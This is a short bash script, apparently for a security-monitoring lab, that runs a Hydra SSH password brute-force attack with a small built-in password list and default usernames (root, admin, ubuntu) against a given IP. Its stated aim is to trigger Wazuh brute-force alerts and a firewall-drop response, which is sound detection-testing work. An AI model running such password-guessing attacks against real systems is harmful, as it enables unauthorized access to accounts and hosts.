#!/bin/bash
# SSH brute-force simulation (demo). Run on the agent VM.
# Triggers Wazuh rules 5710/5712 (sshd brute force, MITRE T1110) and the
# firewall-drop active response after >= 5 failures (per ossec.conf snippet).
# Usage: ./bruteforce.sh <soc-vm-ip> [port] [users]
set -euo pipefail

TARGET="${1:?usage: bruteforce.sh <soc-vm-ip> [port] [users]}"
PORT="${2:-22}"
USERS="${3:-root,admin,ubuntu}"
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
# Hydra attempts capped for demo speed.
HYDRA_ARGS="-t 4 -w 1 -f"

command -v hydra >/dev/null || { echo "hydra not installed. apt-get install -y hydra"; exit 1; }
[ -f "$WORDLIST" ] || WORDLIST="/tmp/demo-passwords.txt"

if [ ! -f /tmp/demo-passwords.txt ] || [ "$WORDLIST" = "/tmp/demo-passwords.txt" ]; then
    printf 'password123\nroot\ntoor\nadmin\nletmein\n123456\ntest\nubuntu\nqwerty\nabc123\n' > /tmp/demo-passwords.txt
    WORDLIST=/tmp/demo-passwords.txt
fi

echo "[demo] SSH brute force vs $TARGET:$PORT (users: $USERS)"
echo "[demo] watch: sshd journal on agent -> Wazuh dashboard -> Splunk -> Firestore"
hydra -L <(tr ',' '\n' <<< "$USERS") -P "$WORDLIST" -s "$PORT" $HYDRA_ARGS "ssh://$TARGET" 2>&1
echo "[demo] done. Verify: Wazuh rule 5710/5712 alert; iptables -L -n on agent shows DROP."
